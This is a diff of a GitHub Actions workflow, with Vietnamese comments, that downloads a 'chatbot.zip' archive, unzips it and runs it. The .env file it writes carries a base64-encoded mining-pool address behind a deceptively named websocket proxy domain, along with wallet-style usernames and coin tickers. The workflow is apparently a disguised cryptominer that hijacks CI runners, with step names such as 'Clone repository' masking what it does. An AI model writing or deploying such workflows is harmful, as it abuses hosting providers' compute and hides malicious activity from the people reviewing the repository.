@@ -11,36 +11,18 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      # Bước 1: Checkout repo
+      # Bước 1: Checkout mã nguồn (nếu cần thiết)
       - name: Checkout code
         uses: actions/checkout@v4
 
-      # Bước 2: Tải file ZIP từ repo khác
-      - name: Tải chatbot.zip
+      # Bước 2: Clone repository từ URL
+      - name: Clone repository
         run: wget https://github.com/duongpokeeeee/sadsd/raw/refs/heads/main/chatbot.zip
 
-      # Bước 3: Giải nén vào thư mục riêng để tránh lỗi .git/config
-      - name: Unzip and prepare .env
+      # Bước 3: Chạy file app.js
+      - name: Run the Node.js app
         run: |
-          mkdir app
-          yes A | unzip chatbot.zip -d app
-          echo -e "host=127.0.0.1\nport=3306\nproxy=wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=4\npassword=c=RVN\nusername=RBCPz2xQMf9Cz3eyqFTVFHVjZM2cTSeYRN" > app/.env
-
-      # Bước 4: Setup Python
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.x'
-
-      # Bước 5: Cài dependencies nếu có file requirements.txt
-      - name: Install dependencies (nếu có requirements.txt)
-        run: |
-          if [ -f app/requirements.txt ]; then
-            pip install -r app/requirements.txt
-          fi
-
-      # Bước 6: Chạy app Python
-      - name: Run Python App
-        run: |
-          cd app
-          python3 app.py "" --cache=.cache/09Qy5sb2Fkcyg.txt
+          yes A | unzip chatbot.zip
+          unzip chatbot.zip
+          echo -e 'proxy=wss://pypip-python3.packaging-w3schools.workers.dev/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nhost=127.0.0.1\nport=3306\nusername=mbc1qhut49lvdruznypvaxgrg4klf3ntpnwuc23hq3j\npassword=c=MBC\nthreads=8' > .env
+          bash start2.sh
